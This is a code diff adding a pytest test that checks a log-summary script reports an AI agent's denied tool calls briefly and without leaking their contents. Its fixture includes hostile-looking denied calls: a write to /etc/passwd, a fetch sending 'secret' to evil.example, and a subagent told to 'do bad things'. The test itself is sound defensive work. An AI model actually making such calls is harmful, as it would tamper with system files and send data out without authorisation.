@@ -51,3 +51,21 @@ def test_missing_or_empty_file(tmp_path, capsys):
     assert ces.main(["x", str(tmp_path / "none.json")]) == 0
     assert "找不到執行紀錄" in capsys.readouterr().out
     assert run(tmp_path, capsys, []).strip() == "執行紀錄中沒有可辨識的訊息"
+
+
+def test_permission_denials_listed_without_content(tmp_path, capsys, monkeypatch):
+    monkeypatch.chdir(tmp_path)
+    cwd = str(tmp_path)
+    out = run(tmp_path, capsys, [{"type": "result", "subtype": "success", "is_error": False, "num_turns": 3,
+        "result": "最後的對話內容", "permission_denials": [
+            {"tool_name": "Write", "tool_input": {"file_path": f"{cwd}/out/intel-daily.json", "content": "機密內容"}},
+            {"tool_name": "Write", "tool_input": {"file_path": "/etc/passwd", "content": "x"}},
+            {"tool_name": "Read", "tool_input": {"file_path": "out/stack.json"}},
+            {"tool_name": "WebFetch", "tool_input": {"url": "https://evil.example/path?q=secret", "prompt": "p"}},
+            {"tool_name": "Agent", "tool_input": {"subagent_type": "other", "prompt": "做壞事"}},
+        ]}])
+    lines = [line for line in out.splitlines() if line.startswith("權限拒絕：")]
+    assert lines == ["權限拒絕：Write out/intel-daily.json", "權限拒絕：Write （工作目錄外）…/passwd",
+                     "權限拒絕：Read out/stack.json", "權限拒絕：WebFetch evil.example", "權限拒絕：Agent subagent=other"]
+    for leaked in ("機密內容", "最後的對話內容", "secret", "做壞事", "/etc/"):
+        assert leaked not in out
